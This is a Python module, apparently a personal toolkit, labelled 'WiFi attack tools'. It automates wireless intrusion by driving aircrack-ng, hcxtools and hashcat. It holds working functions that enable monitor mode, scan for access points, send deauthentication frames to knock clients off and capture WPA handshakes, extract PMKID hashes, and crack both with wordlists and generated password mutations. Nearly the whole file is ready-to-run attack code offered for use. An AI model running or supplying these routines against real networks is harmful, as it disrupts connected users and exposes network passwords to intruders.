# -*- coding: utf-8 -*-
"""WiFi attack tools -- WPA/WPA2 handshake capture, PMKID, deauth, cracking.

Requires: aircrack-ng suite, hcxdumptool, hcxtools (Linux)
Author: zxwn
"""
import subprocess, os, re, hashlib


def start_monitor_mode(interface: str) -> str:
    """Put WiFi interface into monitor mode."""
    subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
    result = subprocess.run(["airmon-ng", "start", interface], capture_output=True, text=True)
    match = re.search(r"monitor mode enabled on (\w+)", result.stdout)
    return match.group(1) if match else interface + "mon"


def scan_networks(interface: str, duration: int = 30) -> list:
    """Scan for WiFi networks and return BSSID/ESSID/channel/signal."""
    import tempfile, time
    tmp = tempfile.mktemp(suffix=".csv")
    proc = subprocess.Popen(
        ["airodump-ng", "--output-format", "csv", "-w", tmp.replace(".csv", ""), interface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(duration)
    proc.terminate()

    networks = []
    try:
        with open(tmp, "r") as f:
            for line in f:
                if "BSSID" in line or not line.strip():
                    continue
                parts = [p.strip() for p in line.split(",")]
                if len(parts) >= 14:
                    networks.append({
                        "bssid": parts[0],
                        "channel": parts[3],
                        "speed": parts[4],
                        "encryption": parts[5],
                        "essid": parts[13].strip(),
                        "signal": parts[8],
                    })
    except:
        pass
    os.unlink(tmp) if os.path.exists(tmp) else None
    return networks


def capture_handshake(interface: str, bssid: str, channel: str, output: str, duration: int = 60):
    """Capture WPA handshake from target AP."""
    import tempfile, time, signal, sys
    subprocess.run(["iwconfig", interface, "channel", channel], capture_output=True)

    dump_proc = subprocess.Popen(
        ["airodump-ng", "--bssid", bssid, "-c", channel, "-w", output, interface],
        stdout=subprocess.DEVNULL
    )
    time.sleep(5)

    # Send deauth to force handshake
    subprocess.run(
        ["aireplay-ng", "--deauth", "10", "-a", bssid, interface],
        capture_output=True, timeout=30
    )

    time.sleep(duration)
    dump_proc.terminate()
    return output + "-01.cap"


def extract_pmkid(pcap_file: str) -> list:
    """Extract PMKID hashes from pcap using hcxtools."""
    pmkid_file = pcap_file + ".pmkid"
    result = subprocess.run(
        ["hcxpcaptool", "-z", pmkid_file, pcap_file],
        capture_output=True, text=True
    )
    pmkids = []
    if os.path.exists(pmkid_file):
        with open(pmkid_file) as f:
            pmkids = [l.strip() for l in f if l.strip()]
    return pmkids


def crack_wpa_handshake(handshake_file: str, wordlist: str) -> str:
    """Crack WPA handshake with wordlist."""
    result = subprocess.run(
        ["aircrack-ng", "-w", wordlist, "-b", "ANY", handshake_file],
        capture_output=True, text=True
    )
    match = re.search(r"KEY FOUND! \[ (.+?) \]", result.stdout)
    return match.group(1) if match else ""


def crack_pmkid_hash(hash_line: str, wordlist: str) -> str:
    """Crack PMKID hash with hashcat (mode 22000)."""
    import tempfile
    tmp = tempfile.mktemp(suffix=".hash")
    with open(tmp, "w") as f:
        f.write(hash_line)
    result = subprocess.run(
        ["hashcat", "-m", "22000", "-a", "0", tmp, wordlist, "--quiet"],
        capture_output=True, text=True
    )
    os.unlink(tmp)
    for line in result.stdout.split("\n"):
        if ":" in line and "hashcat" not in line:
            return line.split(":")[-1].strip()
    return ""


def generate_wordlist_mutations(base_words: list, rules: list = None) -> list:
    """Generate password mutations from base words.

    Rules: capitalise, append_digits, append_special, leet_speak, reverse
    """
    if rules is None:
        rules = ["capitalise", "append_digits", "append_year"]

    mutations = set(base_words)
    for word in base_words:
        if "capitalise" in rules:
            mutations.add(word.capitalize())
            mutations.add(word.upper())
        if "append_digits" in rules:
            for i in range(100):
                mutations.add(word + str(i))
                mutations.add(word + "{:02d}".format(i))
        if "append_year" in rules:
            for y in range(1970, 2030):
                mutations.add(word + str(y))
        if "append_special" in rules:
            for ch in "!@#$%&*":
                mutations.add(word + ch)
        if "leet_speak" in rules:
            leet = word.replace("a", "4").replace("e", "3").replace("i", "1").replace("o", "0").replace("s", "5")
            mutations.add(leet)
        if "reverse" in rules:
            mutations.add(word[::-1])

    return list(mutations)


if __name__ == "__main__":
    print("[wifi_tools] Loaded. (Requires Linux + aircrack-ng + hcxtools + hashcat)")
